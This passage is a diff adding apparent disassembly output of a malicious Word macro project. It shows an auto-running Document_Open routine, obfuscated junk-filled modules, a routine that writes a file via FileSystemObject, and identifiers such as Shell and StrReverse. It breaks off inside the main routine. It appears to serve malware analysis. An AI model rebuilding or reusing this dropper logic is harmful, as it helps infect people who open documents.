@@ -1,0 +1,1458 @@
+Processing file: /home/h/work/20190722/extracted/word/vbaProject.bin
+===============================================================================
+dir stream: VBA/dir
+-------------------------------------------------------------------------------
+dir stream after decompression:
+1610 bytes
+dir stream parsed:
+00000000:  PROJ_SYSKIND:
+00000000   03 00 00 00                                        ....
+
+0000000A:  PROJ_LCID:
+00000000   09 04 00 00                                        ....
+
+00000014:  PROJ_LCIDINVOKE:
+00000000   09 04 00 00                                        ....
+
+0000001E:  PROJ_CODEPAGE:
+00000000   E4 04                                              ..
+
+00000026:  PROJ_NAME:
+00000000   50 72 6F 6A 65 63 74                               Project
+
+00000033:  PROJ_DOCSTRING
+00000039:  PROJ_UNICODE_DOCSTRING
+0000003F:  PROJ_HELPFILE
+00000045:  PROJ_UNICODE_HELPFILE
+0000004B:  PROJ_HELPCONTEXT:
+00000000   00 00 00 00                                        ....
+
+00000055:  PROJ_LIBFLAGS:
+00000000   00 00 00 00                                        ....
+
+0000005F:  PROJ_VERSION:
+00000000   09 B5 1A 5F 06 00                                  ..._..
+
+0000006B:  PROJ_CONSTANTS
+00000071:  PROJ_UNICODE_CONSTANTS
+00000077:  PROJ_REFNAME_PROJ:
+00000000   73 74 64 6F 6C 65                                  stdole
+
+00000083:  PROJ_UNICODE_REFNAME_PROJ:
+00000000   73 00 74 00 64 00 6F 00 6C 00 65 00                s.t.d.o.l.e.
+
+00000095:  PROJ_LIBID_REGISTERED:
+00000000   5E 00 00 00 2A 5C 47 7B 30 30 30 32 30 34 33 30    ^...*\G{00020430
+00000010   2D 30 30 30 30 2D 30 30 30 30 2D 43 30 30 30 2D    -0000-0000-C000-
+00000020   30 30 30 30 30 30 30 30 30 30 34 36 7D 23 32 2E    000000000046}#2.
+00000030   30 23 30 23 43 3A 5C 57 69 6E 64 6F 77 73 5C 53    0#0#C:\Windows\S
+00000040   79 73 74 65 6D 33 32 5C 73 74 64 6F 6C 65 32 2E    ystem32\stdole2.
+00000050   74 6C 62 23 4F 4C 45 20 41 75 74 6F 6D 61 74 69    tlb#OLE Automati
+00000060   6F 6E 00 00 00 00 00 00                            on......
+
+00000103:  PROJ_REFNAME_PROJ:
+00000000   4E 6F 72 6D 61 6C                                  Normal
+
+0000010F:  PROJ_UNICODE_REFNAME_PROJ:
+00000000   4E 00 6F 00 72 00 6D 00 61 00 6C 00                N.o.r.m.a.l.
+
+00000121:  PROJ_LIBID_PROJ:
+00000000   09 00 00 00 2A 5C 43 4E 6F 72 6D 61 6C 09 00 00    ....*\CNormal...
+00000010   00 2A 5C 43 4E 6F 72 6D 61 6C 01 9E F5 5E 03 00    .*\CNormal...^..
+
+00000147:  PROJ_REFNAME_PROJ:
+00000000   4F 66 66 69 63 65                                  Office
+
+00000153:  PROJ_UNICODE_REFNAME_PROJ:
+00000000   4F 00 66 00 66 00 69 00 63 00 65 00                O.f.f.i.c.e.
+
+00000165:  PROJ_LIBID_REGISTERED:
+00000000   94 00 00 00 2A 5C 47 7B 32 44 46 38 44 30 34 43    ....*\G{2DF8D04C
+00000010   2D 35 42 46 41 2D 31 30 31 42 2D 42 44 45 35 2D    -5BFA-101B-BDE5-
+00000020   30 30 41 41 30 30 34 34 44 45 35 32 7D 23 32 2E    00AA0044DE52}#2.
+00000030   30 23 30 23 43 3A 5C 50 72 6F 67 72 61 6D 20 46    0#0#C:\Program F
+00000040   69 6C 65 73 5C 43 6F 6D 6D 6F 6E 20 46 69 6C 65    iles\Common File
+00000050   73 5C 4D 69 63 72 6F 73 6F 66 74 20 53 68 61 72    s\Microsoft Shar
+00000060   65 64 5C 4F 46 46 49 43 45 31 35 5C 4D 53 4F 2E    ed\OFFICE15\MSO.
+00000070   44 4C 4C 23 4D 69 63 72 6F 73 6F 66 74 20 4F 66    DLL#Microsoft Of
+00000080   66 69 63 65 20 31 35 2E 30 20 4F 62 6A 65 63 74    fice 15.0 Object
+00000090   20 4C 69 62 72 61 72 79 00 00 00 00 00 00           Library......
+
+00000209:  PROJ_REFNAME_PROJ:
+00000000   4D 53 46 6F 72 6D 73                               MSForms
+
+00000216:  PROJ_UNICODE_REFNAME_PROJ:
+00000000   4D 00 53 00 46 00 6F 00 72 00 6D 00 73 00          M.S.F.o.r.m.s.
+
+0000022A:  UNKNOWN:
+00000000   2A 5C 47 7B 30 44 34 35 32 45 45 31 2D 45 30 38    *\G{0D452EE1-E08
+00000010   46 2D 31 30 31 41 2D 38 35 32 45 2D 30 32 36 30    F-101A-852E-0260
+00000020   38 43 34 44 30 42 42 34 7D 23 32 2E 30 23 30 23    8C4D0BB4}#2.0#0#
+00000030   43 3A 5C 57 69 6E 64 6F 77 73 5C 73 79 73 74 65    C:\Windows\syste
+00000040   6D 33 32 5C 46 4D 32 30 2E 44 4C 4C 23 4D 69 63    m32\FM20.DLL#Mic
+00000050   72 6F 73 6F 66 74 20 46 6F 72 6D 73 20 32 2E 30    rosoft Forms 2.0
+00000060   20 4F 62 6A 65 63 74 20 4C 69 62 72 61 72 79        Object Library
+
+0000029F:  PROJ_LIBID_TWIDDLED:
+00000000   31 00 00 00 2A 5C 47 7B 30 30 30 30 30 30 30 30    1...*\G{00000000
+00000010   2D 30 30 30 30 2D 30 30 30 30 2D 30 30 30 30 2D    -0000-0000-0000-
+00000020   30 30 30 30 30 30 30 30 30 30 30 30 7D 23 30 2E    000000000000}#0.
+00000030   30 23 30 23 23 00 00 00 00 00 00                   0#0##......
+
+000002E0:  PROJ_REFNAME_PROJ:
+00000000   4D 53 46 6F 72 6D 73                               MSForms
+
+000002ED:  PROJ_UNICODE_REFNAME_PROJ:
+00000000   4D 00 53 00 46 00 6F 00 72 00 6D 00 73 00          M.S.F.o.r.m.s.
+
+00000301:  PROJ_LIBID_EXTENDED:
+00000000   85 00 00 00 2A 5C 47 7B 31 30 44 43 41 33 37 42    ....*\G{10DCA37B
+00000010   2D 31 37 39 30 2D 34 31 42 35 2D 38 46 33 32 2D    -1790-41B5-8F32-
+00000020   38 43 30 45 36 43 30 35 41 44 32 43 7D 23 32 2E    8C0E6C05AD2C}#2.
+00000030   30 23 30 23 43 3A 5C 55 73 65 72 73 5C 76 69 63    0#0#C:\Users\vic
+00000040   74 69 6D 5C 41 70 70 44 61 74 61 5C 4C 6F 63 61    tim\AppData\Loca
+00000050   6C 5C 54 65 6D 70 5C 56 42 45 5C 4D 53 46 6F 72    l\Temp\VBE\MSFor
+00000060   6D 73 2E 65 78 64 23 4D 69 63 72 6F 73 6F 66 74    ms.exd#Microsoft
+00000070   20 46 6F 72 6D 73 20 32 2E 30 20 4F 62 6A 65 63     Forms 2.0 Objec
+00000080   74 20 4C 69 62 72 61 72 79 00 00 00 00 00 00 E1    t Library.......
+00000090   2E 45 0D 8F E0 1A 10 85 2E 02 60 8C 4D 0B B4 01    .E........`.M...
+000000A0   00 00 00                                           ...
+
+000003AA:  PROJ_MODULECOUNT:
+00000000   05 00                                              ..
+
+000003B2:  PROJ_COOKIE:
+00000000   FD 09                                              ..
+
+000003BA:  MOD_NAME:
+00000000   54 68 69 73 44 6F 63 75 6D 65 6E 74                ThisDocument
+
+000003CC:  MOD_UNICODE_NAME:
+00000000   54 00 68 00 69 00 73 00 44 00 6F 00 63 00 75 00    T.h.i.s.D.o.c.u.
+00000010   6D 00 65 00 6E 00 74 00                            m.e.n.t.
+
+000003EA:  MOD_STREAM:
+00000000   54 68 69 73 44 6F 63 75 6D 65 6E 74                ThisDocument
+
+000003FC:  MOD_UNICODESTREAM:
+00000000   54 00 68 00 69 00 73 00 44 00 6F 00 63 00 75 00    T.h.i.s.D.o.c.u.
+00000010   6D 00 65 00 6E 00 74 00                            m.e.n.t.
+
+0000041A:  MOD_DOCSTRING
+00000420:  MOD_UNICODE_DOCSTRING
+00000426:  MOD_TEXTOFFSET:
+00000000   05 09 00 00                                        ....
+
+00000430:  MOD_HELPCONTEXT:
+00000000   00 00 00 00                                        ....
+
+0000043A:  MOD_COOKIETYPE:
+00000000   00 1C                                              ..
+
+00000442:  MOD_FBASMOD_Classes
+00000448:  MOD_END
+0000044E:  MOD_NAME:
+00000000   61 4D 36 51 75 32 76 66 53                         aM6Qu2vfS
+
+0000045D:  MOD_UNICODE_NAME:
+00000000   61 00 4D 00 36 00 51 00 75 00 32 00 76 00 66 00    a.M.6.Q.u.2.v.f.
+00000010   53 00                                              S.
+
+00000475:  MOD_STREAM:
+00000000   61 4D 36 51 75 32 76 66 53                         aM6Qu2vfS
+
+00000484:  MOD_UNICODESTREAM:
+00000000   61 00 4D 00 36 00 51 00 75 00 32 00 76 00 66 00    a.M.6.Q.u.2.v.f.
+00000010   53 00                                              S.
+
+0000049C:  MOD_DOCSTRING
+000004A2:  MOD_UNICODE_DOCSTRING
+000004A8:  MOD_TEXTOFFSET:
+00000000   FE 08 00 00                                        ....
+
+000004B2:  MOD_HELPCONTEXT:
+00000000   00 00 00 00                                        ....
+
+000004BC:  MOD_COOKIETYPE:
+00000000   88 B2                                              ..
+
+000004C4:  MOD_FBASMOD_StdMods
+000004CA:  MOD_END
+000004D0:  MOD_NAME:
+00000000   61 66 4A 58 36 45 4C 70 50                         afJX6ELpP
+
+000004DF:  MOD_UNICODE_NAME:
+00000000   61 00 66 00 4A 00 58 00 36 00 45 00 4C 00 70 00    a.f.J.X.6.E.L.p.
+00000010   50 00                                              P.
+
+000004F7:  MOD_STREAM:
+00000000   61 66 4A 58 36 45 4C 70 50                         afJX6ELpP
+
+00000506:  MOD_UNICODESTREAM:
+00000000   61 00 66 00 4A 00 58 00 36 00 45 00 4C 00 70 00    a.f.J.X.6.E.L.p.
+00000010   50 00                                              P.
+
+0000051E:  MOD_DOCSTRING
+00000524:  MOD_UNICODE_DOCSTRING
+0000052A:  MOD_TEXTOFFSET:
+00000000   05 12 00 00                                        ....
+
+00000534:  MOD_HELPCONTEXT:
+00000000   00 00 00 00                                        ....
+
+0000053E:  MOD_COOKIETYPE:
+00000000   7F 31                                              .1
+
+00000546:  MOD_FBASMOD_StdMods
+0000054C:  MOD_END
+00000552:  MOD_NAME:
+00000000   61 6C 54 75 55 65 6D 77                            alTuUemw
+
+00000560:  MOD_UNICODE_NAME:
+00000000   61 00 6C 00 54 00 75 00 55 00 65 00 6D 00 77 00    a.l.T.u.U.e.m.w.
+
+00000576:  MOD_STREAM:
+00000000   61 6C 54 75 55 65 6D 77                            alTuUemw
+
+00000584:  MOD_UNICODESTREAM:
+00000000   61 00 6C 00 54 00 75 00 55 00 65 00 6D 00 77 00    a.l.T.u.U.e.m.w.
+
+0000059A:  MOD_DOCSTRING
+000005A0:  MOD_UNICODE_DOCSTRING
+000005A6:  MOD_TEXTOFFSET:
+00000000   AC 21 00 00                                        .!..
+
+000005B0:  MOD_HELPCONTEXT:
+00000000   00 00 00 00                                        ....
+
+000005BA:  MOD_COOKIETYPE:
+00000000   90 E9                                              ..
+
+000005C2:  MOD_FBASMOD_StdMods
+000005C8:  MOD_END
+000005CE:  MOD_NAME:
+00000000   61 30 77 6F 78 6D                                  a0woxm
+
+000005DA:  MOD_UNICODE_NAME:
+00000000   61 00 30 00 77 00 6F 00 78 00 6D 00                a.0.w.o.x.m.
+
+000005EC:  MOD_STREAM:
+00000000   61 30 77 6F 78 6D                                  a0woxm
+
+000005F8:  MOD_UNICODESTREAM:
+00000000   61 00 30 00 77 00 6F 00 78 00 6D 00                a.0.w.o.x.m.
+
+0000060A:  MOD_DOCSTRING
+00000610:  MOD_UNICODE_DOCSTRING
+00000616:  MOD_TEXTOFFSET:
+00000000   B0 0A 00 00                                        ....
+
+00000620:  MOD_HELPCONTEXT:
+00000000   00 00 00 00                                        ....
+
+0000062A:  MOD_COOKIETYPE:
+00000000   03 43                                              .C
+
+00000632:  MOD_FBASMOD_Classes
+00000638:  MOD_FBASMOD_Private
+0000063E:  MOD_END
+00000644:  PROJ_EOF
+-------------------------------------------------------------------------------
+_VBA_PROJECT stream:
+5478 bytes
+Identifiers:
+
+0000: Word
+0001: VBA
+0002: Win16
+0003: Win32
+0004: Win64
+0005: Mac
+0006: VBA6
+0007: VBA7
+0008: Project
+0009: stdole
+000A: Normal
+000B: Office
+000C: MSForms
+000D: ThisDocument
+000E: _Evaluate
+000F: Document_Open
+0010: ayWPM
+0011: aPAhNd9xj
+0012: adfIsQXbi
+0013: aOs5Iid
+0014: aQwnqvl1
+0015: a6jVrsW
+0016: aMJtUv
+0017: a1YXrsJp
+0018: aJrsBLRGE
+0019: main
+001A: aM6Qu2vfS
+001B: aoYbuI
+001C: aX2A6F9V
+001D: a8P4c7Fh5
+001E: a8lcy4goh
+001F: atfcLg
+0020: aqBgFRl
+0021: a7GpzhQuI
+0022: aPpjFSs
+0023: awIyP8O1
+0024: abqNl
+0025: aeS81lvV
+0026: auNtz
+0027: aSpiAEc
+0028: afJX6ELpP
+0029: au2pneaM
+002A: aODWg8
+002B: acaElO
+002C: a4L1gb
+002D: anRyMqN98
+002E: aku2pi
+002F: atqe4WD
+0030: af8nIw
+0031: aA7eBf
+0032: ao4Wn
+0033: aJsBMNKzp
+0034: aGBoEb7
+0035: a4BGLt
+0036: a9nlekF
+0037: aBNzu
+0038: adWspA8
+0039: aSVp8zOe
+003A: aH6MX
+003B: ajT74
+003C: CreateObject
+003D: amxgqjco
+003E: CreateTextFile
+003F: avfyh
+0040: adFnY
+0041: a0o8mz
+0042: aLSJy2
+0043: a7bszI
+0044: abOgHVUT
+0045: aMstj7lF6
+0046: axtnAZTyK
+0047: aVlA9q
+0048: akN9tjm
+0049: aCoFzRD
+004A: alTuUemw
+004B: aaQlMr
+004C: aRiYov
+004D: aNzlI
+004E: arZJa
+004F: a2NgyD1dC
+0050: avKRz
+0051: aS9wHfi
+0052: aSaAjdGg
+0053: atBCe
+0054: adxrhc
+0055: aTloBe
+0056: a9me0xw5
+0057: azBn5
+0058: aKO10Io
+0059: a3ropzL9s
+005A: afj1Aq43R
+005B: aCU7oL
+005C: aAbHfR
+005D: aXtIkN
+005E: a6e0LJ7
+005F: aZ496I
+0060: aoG8er
+0061: a0woxm
+0062: aeoFY1
+0063: aB2Hdp
+0064: aUNrk7
+0065: akZUbfhQ
+0066: aHwPzG
+0067: a01DumIa
+0068: aGTiU
+0069: auJtb
+006A: aBb80q4Pa
+006B: auoGQw3
+006C: aFh7lS9d
+006D: aLBYw0
+006E: agvpx
+006F: aDcZdG
+0070: axGbY
+0071: aNSmdzfk1
+0072: awzhTkbMS
+0073: afemjKg97
+0074: auM68Ag
+0075: aErQyi2gz
+0076: aVcFDEi
+0077: a7zKv
+0078: Chr
+0079: aiOM8J
+007A: aeAFaG4
+007B: aB8pyl
+007C: aZfPL96
+007D: arN4esO
+007E: ad48H
+007F: aQEnXN
+0080: aoGiXhZt6
+0081: afTt6gON
+0082: a2VbTxOCP
+0083: aG2us
+0084: aWFvAHo5
+0085: awbJZu
+0086: aR98iMO
+0087: a7nUHBR
+0088: aPWET
+0089: a6JrwTD
+008A: a5rk9
+008B: StrReverse
+008C: Shell
+008D: a3Csw6Z1
+008E: aBdjQApr
+008F: aL7hGU8
+0090: aD89R
+0091: alk15e
+0092: arbDG48VP
+0093: a6WUx
+0094: aBrSHazJU
+0095: ae6XvTqrf
+0096: auJtb_Change
+0097: UserForm_Initialize
+0098: asMDNG4
+0099: aDdyE
+009A: azmrO5
+009B: aKuZICr7
+009C: aDb701JOn
+009D: test
+009E: a87qC0z
+009F: azyFP3iH4
+00A0: aYFmEgX
+00A1: Document
+00A2: UserForm
+00A3: Change
+00A4: Initialize
+00A5: _B_var_Chr
+00A6: _B_var_a7zKv
+00A7: _B_var_a5rk9
+
+_VBA_PROJECT parsing done.
+-------------------------------------------------------------------------------
+Module streams:
+VBA/ThisDocument - 2383 bytes
+Line #0:
+	FuncDefn (Sub Document_Open())
+Line #1:
+	Dim 
+	VarDefn ayWPM (As Boolean)
+Line #2:
+	LitVarSpecial (False)
+	St ayWPM 
+Line #3:
+	QuoteRem 0x0000 0x000E " Yearly alpine"
+Line #4:
+	Dim 
+	VarDefn aPAhNd9xj (As Long)
+Line #5:
+	LitDI2 0x5A00 
+	St aPAhNd9xj 
+Line #6:
+	QuoteRem 0x0000 0x0029 " Narrate principal starting vhs estranged"
+Line #7:
+	Dim 
+	VarDefn adfIsQXbi (As String)
+Line #8:
+	LitStr 0x0005 "aNGJ2"
+	St adfIsQXbi 
+Line #9:
+	QuoteRem 0x0000 0x000C " Inscrutable"
+Line #10:
+	QuoteRem 0x0000 0x0000 ""
+Line #11:
+	Dim 
+	VarDefn aOs5Iid (As Long)
+Line #12:
+	LitDI2 0x1E7B 
+	St aOs5Iid 
+Line #13:
+	QuoteRem 0x0000 0x0018 " Tech albumen debauchery"
+Line #14:
+	Dim 
+	VarDefn aQwnqvl1 (As Integer)
+Line #15:
+	LitDI2 0x599A 
+	St aQwnqvl1 
+Line #16:
+	QuoteRem 0x0000 0x0028 " Drinking produced bobby map residential"
+Line #17:
+	Dim 
+	VarDefn a6jVrsW (As String)
+Line #18:
+	LitStr 0x0009 "aYTM2D7l1"
+	St a6jVrsW 
+Line #19:
+Line #20:
+	Dim 
+	VarDefn aMJtUv (As String)
+Line #21:
+	LitStr 0x0007 "axD21MT"
+	St aMJtUv 
+Line #22:
+	Dim 
+	VarDefn a1YXrsJp (As Long)
+Line #23:
+	LitDI2 0x3EBE 
+	UMi 
+	St a1YXrsJp 
+Line #24:
+	Dim 
+	VarDefn aJrsBLRGE (As Boolean)
+Line #25:
+	LitVarSpecial (True)
+	St aJrsBLRGE 
+Line #26:
+	QuoteRem 0x0000 0x0013 " Trice xavier space"
+Line #27:
+	ArgsCall main 0x0000 
+Line #28:
+	EndSub 
+VBA/aM6Qu2vfS - 2862 bytes
+Line #0:
+	FuncDefn (Function aoYbuI(aX2A6F9V As Long) As String)
+Line #1:
+	Dim 
+	VarDefn a8P4c7Fh5 (As Integer)
+Line #2:
+	LitDI2 0x2663 
+	UMi 
+	St a8P4c7Fh5 
+Line #3:
+	Dim 
+	VarDefn a8lcy4goh (As String)
+Line #4:
+	LitStr 0x0009 "a8JN2TZBb"
+	St a8lcy4goh 
+Line #5:
+	Dim 
+	VarDefn atfcLg (As Boolean)
+Line #6:
+	LitVarSpecial (False)
+	St atfcLg 
+Line #7:
+	QuoteRem 0x0000 0x000E " Equipped zero"
+Line #8:
+Line #9:
+	Dim 
+	VarDefn aqBgFRl (As String)
+Line #10:
+	LitStr 0x0005 "aqUsB"
+	St aqBgFRl 
+Line #11:
+	QuoteRem 0x0000 0x0027 " Truck smith opprobrium throws infinity"
+Line #12:
+	Dim 
+	VarDefn a7GpzhQuI (As String)
+Line #13:
+	LitStr 0x0008 "a1e7WpcO"
+	St a7GpzhQuI 
+Line #14:
+	QuoteRem 0x0000 0x000C " Asus cereal"
+Line #15:
+	Dim 
+	VarDefn aPpjFSs (As String)
+Line #16:
+	LitStr 0x0007 "aD4EFjV"
+	St aPpjFSs 
+Line #17:
+	Dim 
+	VarDefn awIyP8O1 (As Boolean)
+Line #18:
+	LitVarSpecial (False)
+	St awIyP8O1 
+Line #19:
+	QuoteRem 0x0000 0x0026 " Boobs lecturer bedford yard voiceless"
+Line #20:
+	Dim 
+	VarDefn abqNl (As String)
+Line #21:
+	LitStr 0x0005 "a47wZ"
+	St abqNl 
+Line #22:
+	QuoteRem 0x0000 0x0019 " Convocation strain danny"
+Line #23:
+	Dim 
+	VarDefn aeS81lvV (As String)
+Line #24:
+	LitStr 0x0005 "auXae"
+	St aeS81lvV 
+Line #25:
+	QuoteRem 0x0000 0x001C " Qatar stimulation commodity"
+Line #26:
+Line #27:
+	Dim 
+	VarDefn auNtz (As String)
+Line #28:
+	LitStr 0x0006 "aJfsFZ"
+	St auNtz 
+Line #29:
+	QuoteRem 0x0000 0x0019 " Intercede meager charger"
+Line #30:
+	Dim 
+	VarDefn aSpiAEc (As Integer)
+Line #31:
+	LitDI2 0x6CE0 
+	UMi 
+	St aSpiAEc 
+Line #32:
+	EndFunc 
+VBA/afJX6ELpP - 5915 bytes
+Line #0:
+	FuncDefn (Function au2pneaM(aODWg8 As String) As String)
+Line #1:
+	Dim 
+	VarDefn acaElO (As Integer)
+Line #2:
+	LitDI2 0x366C 
+	St acaElO 
+Line #3:
+	QuoteRem 0x0000 0x000F " Etruscan usury"
+Line #4:
+	Dim 
+	VarDefn a4L1gb (As Boolean)
+Line #5:
+	LitVarSpecial (True)
+	St a4L1gb 
+Line #6:
+	QuoteRem 0x0000 0x0019 " Improvident mister annex"
+Line #7:
+	Dim 
+	VarDefn anRyMqN98 (As Long)
+Line #8:
+	LitDI2 0x5974 
+	UMi 
+	St anRyMqN98 
+Line #9:
+	QuoteRem 0x0000 0x0007 " Issues"
+Line #10:
+	Dim 
+	VarDefn aku2pi (As String)
+Line #11:
+	LitStr 0x0005 "aVudi"
+	St aku2pi 
+Line #12:
+	QuoteRem 0x0000 0x0013 " Personnel animates"
+Line #13:
+Line #14:
+	Dim 
+	VarDefn atqe4WD (As String)
+Line #15:
+	LitStr 0x0009 "aQfho1prA"
+	St atqe4WD 
+Line #16:
+	QuoteRem 0x0000 0x0005 " Tram"
+Line #17:
+	Dim 
+	VarDefn af8nIw (As Integer)
+Line #18:
+	LitDI2 0x546A 
+	St af8nIw 
+Line #19:
+	QuoteRem 0x0000 0x0013 " Arranged deprecate"
+Line #20:
+Line #21:
+	Dim 
+	VarDefn aA7eBf (As String)
+Line #22:
+	LitStr 0x0006 "aa8Wbq"
+	St aA7eBf 
+Line #23:
+	QuoteRem 0x0000 0x001C " Soon certification humidity"
+Line #24:
+	Dim 
+	VarDefn ao4Wn (As Long)
+Line #25:
+	LitDI2 0x06B5 
+	St ao4Wn 
+Line #26:
+	QuoteRem 0x0000 0x0010 " Lanes beginning"
+Line #27:
+	Dim 
+	VarDefn aJsBMNKzp (As String)
+Line #28:
+	LitStr 0x0005 "a1Sks"
+	St aJsBMNKzp 
+Line #29:
+	QuoteRem 0x0000 0x001F " Vengeful aluminium result wifi"
+Line #30:
+	Dim 
+	VarDefn aGBoEb7 (As Integer)
+Line #31:
+	LitDI2 0x42B0 
+	St aGBoEb7 
+Line #32:
+	Dim 
+	VarDefn a4BGLt (As String)
+Line #33:
+	LitStr 0x0007 "a4uOpNM"
+	St a4BGLt 
+Line #34:
+	QuoteRem 0x0000 0x0009 " Ky plate"
+Line #35:
+	Dim 
+	VarDefn a9nlekF (As String)
+Line #36:
+	LitStr 0x0005 "alE9m"
+	St a9nlekF 
+Line #37:
+	QuoteRem 0x0000 0x0025 " Progress behalf right-hand reporting"
+Line #38:
+	Dim 
+	VarDefn aBNzu (As String)
+Line #39:
+	LitStr 0x0009 "aKxDm3Ova"
+	St aBNzu 
+Line #40:
+	QuoteRem 0x0000 0x002E " Formality skills biographies statuesque dicks"
+Line #41:
+	EndFunc 
+Line #42:
+	FuncDefn (Public Sub adWspA8(aSVp8zOe As String))
+Line #43:
+	Dim 
+	VarDefn ajT74 (As Object)
+Line #44:
+	SetStmt 
+	LitStr 0x001A "Scripting.FileSystemObject"
+	ArgsLd CreateObject 0x0001 
+	Set ajT74 
+Line #45:
+	Dim 
+	VarDefn amxgqjco (As Object)
+Line #46:
+	SetStmt 
+	Ld aSVp8zOe 
+	LitVarSpecial (True)
+	LitVarSpecial (True)
+	Ld ajT74 
+	ArgsMemLd CreateTextFile 0x0003 
+	Set amxgqjco 
+Line #47:
+	Ld aH6MX 
+	Ld amxgqjco 
+	ArgsMemCall Write 0x0001 
+Line #48:
+	Ld amxgqjco 
+	ArgsMemCall Close 0x0000 
+Line #49:
+	Dim 
+	VarDefn avfyh (As Long)
+Line #50:
+	LitDI2 0x245B 
+	St avfyh 
+Line #51:
+	QuoteRem 0x0000 0x000A " Designers"
+Line #52:
+	Dim 
+	VarDefn adFnY (As String)
+Line #53:
+	LitStr 0x0007 "aDMm7TH"
+	St adFnY 
+Line #54:
+	Dim 
+	VarDefn a0o8mz (As Long)
+Line #55:
+	LitDI2 0x20FB 
+	UMi 
+	St a0o8mz 
+Line #56:
+	QuoteRem 0x0000 0x000E " Term reporter"
+Line #57:
+	Dim 
+	VarDefn aLSJy2 (As String)
+Line #58:
+	LitStr 0x0009 "akgyqHKb0"
+	St aLSJy2 
+Line #59:
+	QuoteRem 0x0000 0x0008 " Creator"
+Line #60:
+	Dim 
+	VarDefn a7bszI (As Long)
+Line #61:
+	LitDI2 0x1EBA 
+	UMi 
+	St a7bszI 
+Line #62:
+	QuoteRem 0x0000 0x0009 " Snapshot"
+Line #63:
+	Dim 
+	VarDefn abOgHVUT (As Boolean)
+Line #64:
+	LitVarSpecial (True)
+	St abOgHVUT 
+Line #65:
+	Dim 
+	VarDefn aMstj7lF6 (As String)
+Line #66:
+	LitStr 0x0007 "a4fkT0i"
+	St aMstj7lF6 
+Line #67:
+	QuoteRem 0x0000 0x001D " Trucks posterior compression"
+Line #68:
+	Dim 
+	VarDefn axtnAZTyK (As Integer)
+Line #69:
+	LitDI2 0x53E4 
+	St axtnAZTyK 
+Line #70:
+	QuoteRem 0x0000 0x0031 " Cliff absinthe thy pantheon exasperation platoon"
+Line #71:
+Line #72:
+	Dim 
+	VarDefn aVlA9q (As String)
+Line #73:
+	LitStr 0x0009 "aeaPcNjW8"
+	St aVlA9q 
+Line #74:
+	QuoteRem 0x0000 0x0023 " Linguist inflected boeotia blasted"
+Line #75:
+	Dim 
+	VarDefn akN9tjm (As Boolean)
+Line #76:
+	LitVarSpecial (False)
+	St akN9tjm 
+Line #77:
+	QuoteRem 0x0000 0x0028 " Investments perturbation ministry acorn"
+Line #78:
+	Dim 
+	VarDefn aCoFzRD (As String)
+Line #79:
+	LitStr 0x0009 "aSVjmBrg1"
+	St aCoFzRD 
+Line #80:
+	QuoteRem 0x0000 0x0021 " Partisan avignon sealskin edited"
+Line #81:
+	EndSub 
+VBA/alTuUemw - 11418 bytes
+Line #0:
+	FuncDefn (Sub main())
+Line #1:
+	Dim 
+	VarDefn aaQlMr (As Boolean)
+Line #2:
+	LitVarSpecial (False)
+	St aaQlMr 
+Line #3:
+	QuoteRem 0x0000 0x000A " Lancaster"
+Line #4:
+	Dim 
+	VarDefn aRiYov (As Boolean)
+Line #5:
+	LitVarSpecial (True)
+	St aRiYov 
+Line #6:
+	QuoteRem 0x0000 0x0024 " Omaha beastality slides tenaciously"
+Line #7:
+	Dim 
+	VarDefn aNzlI (As Boolean)
+Line #8:
+	LitVarSpecial (False)
+	St aNzlI 
+Line #9:
+	QuoteRem 0x0000 0x0017 " Worshipping likelihood"
+Line #10:
+	Dim 
+	VarDefn arZJa (As Boolean)
+Line #11:
+	LitVarSpecial (True)
+	St arZJa 
+Line #12:
+	Dim 
+	VarDefn a2NgyD1dC (As String)
+Line #13:
+	LitStr 0x0005 "aeC1B"
+	St a2NgyD1dC 
+Line #14:
+	QuoteRem 0x0000 0x001B " Whiles stations alchemists"
+Line #15:
+	Dim 
+	VarDefn avKRz (As Integer)
+Line #16:
+	LitDI2 0x3F4E 
+	UMi 
+	St avKRz 
+Line #17:
+	Dim 
+	VarDefn aS9wHfi (As String)
+Line #18:
+	LitStr 0x0009 "aVxEmOkTZ"
+	St aS9wHfi 
+Line #19:
+	QuoteRem 0x0000 0x0018 " Jets quarterly contract"
+Line #20:
+Line #21:
+	Dim 
+	VarDefn aSaAjdGg (As String)
+Line #22:
+	LitStr 0x0009 "ayYVc2Svz"
+	St aSaAjdGg 
+Line #23:
+	QuoteRem 0x0000 0x001D " Liver torpedoes contribution"
+Line #24:
+	Dim 
+	VarDefn atBCe (As Boolean)
+Line #25:
+	LitVarSpecial (False)
+	St atBCe 
+Line #26:
+	QuoteRem 0x0000 0x0011 " Vicarage donated"
+Line #27:
+	Dim 
+	VarDefn adxrhc (As Boolean)
+Line #28:
+	LitVarSpecial (True)
+	St adxrhc 
+Line #29:
+	Dim 
+	VarDefn aTloBe (As Boolean)
+Line #30:
+	LitVarSpecial (True)
+	St aTloBe 
+Line #31:
+	QuoteRem 0x0000 0x0017 " Bracelet ornamentation"
+Line #32:
+	Dim 
+	VarDefn a9me0xw5 (As Boolean)
+Line #33:
+	LitVarSpecial (True)
+	St a9me0xw5 
+Line #34:
+	QuoteRem 0x0000 0x0013 " Suites despondency"
+Line #35:
+	Dim 
+	VarDefn azBn5 (As Boolean)
+Line #36:
+	LitVarSpecial (True)
+	St azBn5 
+Line #37:
+	QuoteRem 0x0000 0x0017 " Ax adverted ng pointer"
+Line #38:
+	Dim 
+	VarDefn aKO10Io (As Long)
+Line #39:
+	LitDI2 0x5A68 
+	UMi 
+	St aKO10Io 
+Line #40:
+	Dim 
+	VarDefn a3ropzL9s (As String)
+Line #41:
+	LitStr 0x0006 "aEzmHh"
+	St a3ropzL9s 
+Line #42:
+	QuoteRem 0x0000 0x0013 " Regardless quartet"
+Line #43:
+	Dim 
+	VarDefn afj1Aq43R (As Long)
+Line #44:
+	LitDI2 0x30DE 
+	UMi 
+	St afj1Aq43R 
+Line #45:
+	QuoteRem 0x0000 0x0015 " Solaris trainer tail"
+Line #46:
+	Dim 
+	VarDefn aCU7oL (As Integer)
+Line #47:
+	LitDI2 0x2E94 
+	UMi 
+	St aCU7oL 
+Line #48:
+	Dim 
+	VarDefn aAbHfR (As Boolean)
+Line #49:
+	LitVarSpecial (False)
+	St aAbHfR 
+Line #50:
+	QuoteRem 0x0000 0x0015 " Sitemap park sailing"
+Line #51:
+	Dim 
+	VarDefn aXtIkN (As Object)
+Line #52:
+	Dim 
+	VarDefn a6e0LJ7 (As Boolean)
+Line #53:
+	LitVarSpecial (True)
+	St a6e0LJ7 
+Line #54:
+	QuoteRem 0x0000 0x001B " Insertion hesse translated"
+Line #55:
+	Dim 
+	VarDefn aZ496I (As Boolean)
+Line #56:
